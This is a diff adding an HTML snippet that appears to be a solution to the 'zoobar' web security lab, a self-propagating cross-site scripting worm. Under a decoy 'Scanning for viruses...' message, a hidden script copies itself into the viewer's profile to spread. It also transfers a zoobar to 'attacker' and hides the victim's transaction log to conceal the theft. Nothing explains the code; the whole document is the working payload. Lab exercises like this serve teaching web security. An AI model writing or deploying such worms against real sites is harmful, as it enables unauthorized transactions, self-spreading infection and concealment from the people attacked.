@@ -1,0 +1,27 @@
+<div id="copythis">
+  <p>Scanning for viruses...</p>
+  <div style="visibility:hidden; height:0; width:0; position:absolute;">
+    <script>
+      document.addEventListener("DOMContentLoaded", changeProfile, false);
+      function changeProfile(e) {
+        var content = document.getElementById("copythis").outerHTML;
+        var params = "profile_update=" + encodeURIComponent(content) + "&profile_submit=Save";
+        var oReq = new XMLHttpRequest();
+        oReq.open("POST", "/zoobar/index.cgi/", true);         
+        oReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        oReq.send(params)
+          
+        var params2 = "zoobars=1&recipient=attacker&submission=Send";
+        var oReq2 = new XMLHttpRequest();
+        oReq2.open("POST", "/zoobar/index.cgi/transfer", true);
+        oReq2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        oReq2.send(params2);
+        var entries = document.getElementsByClassName("log")[0].getElementsByTagName("TBODY");
+        for (i=0; i < entries.length; i++){
+          entries[i].style = "visibility:hidden; height:0; width:0;";
+        }
+      }
+    </script>
+  </div>
+  <span id="zoobars" class="10"></span>
+</div>
